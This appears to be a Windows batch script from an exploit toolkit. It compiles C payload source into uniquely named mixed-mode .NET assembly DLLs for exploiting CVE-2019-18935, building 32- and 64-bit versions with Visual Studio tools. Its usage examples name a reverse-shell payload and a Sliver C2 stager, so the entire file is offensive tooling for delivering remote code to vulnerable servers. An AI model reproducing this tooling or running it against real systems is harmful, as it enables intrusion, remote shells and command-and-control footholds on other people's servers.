:: Author:   @noperator
:: Purpose:  Compile a uniquely named mixed mode .NET assembly DLL as a payload
::           for exploiting CVE-2019-18935.
:: Notes:    - You may need to adjust the VSPATH variable to point to the path
::             of your Visual Studio installation.
::           - Generates both 32- and 64-bit payloads if no CPU architecture is
::             specified as a second CLI argument.
::           - Writes payloads to the folder specified by the OUTDIR variable.
:: Usage:    .\build-dll.bat <PAYLOAD> [<ARCH>]
::           .\build-dll.bat sleep.c
::           .\build-dll.bat reverse-shell.c x86
::           .\build-dll.bat sliver-stager.c amd64

@echo off

:: Point this to the path of your Visual Studio installation.
set VSPATH=C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build

:: Create directory for compiled payloads.
set OUTDIR=payloads
if not exist "%OUTDIR%" mkdir "%OUTDIR%"

:: Get payload name.
set PAYLOAD=%1
set BASENAME=%PAYLOAD:~0,-2%

:: Get CPU architecture. Generates both if none specified.
set ARCH=%2
if [%ARCH%]==[] set ARCH=x86 amd64

:: Build a datetime string to uniquely name this .NET assembly.
for /f "tokens=2-4 delims=/ " %%a in ("%DATE%") do (
    set YYYY=%%c
    set MM=%%a
    set DD=%%b
)
for /f "tokens=1-4 delims=/:." %%a in ("%TIME: =0%") do (
    set HH=%%a
    set MI=%%b
    set SS=%%c
    set FF=%%d
)
set DATETIME=%YYYY%%MM%%DD%%HH%%MI%%SS%%FF%

:: Create dummy C# file to consistute managed portion of mixed mode assembly.
echo class Empty {} > empty.cs

:: Compile payload. (set|end)local required to prevent a growing PATH variable
:: from multiple calls to vcvarsall.bat. Otherwise, multiple runs of this
:: script in the same CMD window will eventually fail with: "The input line is
:: too long. The syntax of the command is incorrect."
for %%a in (%ARCH%) do (
    @echo on

    echo.
    echo [*] Set up %%a build environment...
    setlocal
    call "%VSPATH%\vcvarsall.bat" %%a

    echo.
    echo [*] Compile managed code, without generating an assembly...
    csc /target:module empty.cs

    echo [*] Compile unmanaged code, without linking...
    cl /c %PAYLOAD%

    echo.
    echo [*] Link the compiled .netmodule and .obj files, creating a mixed mode .NET assembly DLL...
    link /DLL /LTCG /CLRIMAGETYPE:IJW /out:%OUTDIR%\%BASENAME%-%DATETIME%-%%a.dll %BASENAME%.obj empty.netmodule

    echo.
    echo [*] Clean up build artifacts and tear down %%a build environment...
    del %BASENAME%.obj empty.netmodule
    endlocal

    dir %OUTDIR%\%BASENAME%-%DATETIME%-%%a.dll

    @echo off
)
